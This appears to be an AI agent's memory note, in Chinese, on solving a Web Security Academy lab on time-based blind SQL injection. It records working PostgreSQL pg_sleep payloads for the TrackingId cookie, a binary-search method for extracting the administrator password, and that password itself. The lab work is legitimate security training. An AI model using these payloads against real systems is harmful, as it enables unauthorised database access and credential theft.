---
metadata:
  node_type: memory
name: "PRS arm A lab-time-delays-info-retrieval"
description: "arm A 基线:lab-time-delays-info-retrieval 冷实例一次通过 - TrackingId 时间盲注二分取 administrator 20 位口令,登录即 banner is-solved(须读 /my-account 而非首页)"
last_updated: 2026-10-09T06:20:13+08:00
created: 2026-10-09T06:20:13+08:00
---

## 2026-10-09 arm A 基线:lab-time-delays-info-retrieval(盲注时间延迟 + 信息提取)

- 实例:`range_launch launch-url /web-security/sql-injection/blind/lab-time-delays-info-retrieval` → reused:false,`https://0a9e00f5...web-security-academy.net/`(取号一次成功,未走 /api/widgets)。
- DB = PostgreSQL。注入点 = `TrackingId` cookie。三种拼接都出 3s 延迟:`xyz'||pg_sleep(3)--`、`xyz'||(SELECT CASE WHEN (...) THEN pg_sleep(3) ELSE pg_sleep(0) END)--`(带 `||'` 收尾亦可)。
- 抽取:`ascii(substring(password,{I},1))>{C}` 二分(32-126)+ 每字符两端复核(cond(code) 假、cond(code-1) 真),179 请求 / 456s 出 `irm6bcm0vl7ghya1fijj`(20 位,length>19 真 / >20 假已先定长)。
- 登录:GET /login 取 csrf(`html_text --tag input --contains csrf`)→ POST /login(administrator + 口令)→ 302 `/my-account?id=administrator` → banner is-solved。
- 坑 1(翻牌页):**首页 banner 不翻**,`/my-account` 才带 `academyLabBanner is-solved` + Congratulations;banner_verdict 必须打 `/my-account`。
- 坑 2(阈值):该实例假腿基线约 0.95-1.05s,故 sleep 3 配阈值须 >=1.8s(默认 sleep*0.6=1.8s 恰好可用),不能再压低。
- 新件:项目层 `time_oracle` v1.0.0(时间型布尔 oracle:--eval 定点对照 / --bisect 码值二分 / --charset 逐字符 / 每位置两端复核),selftest 过。
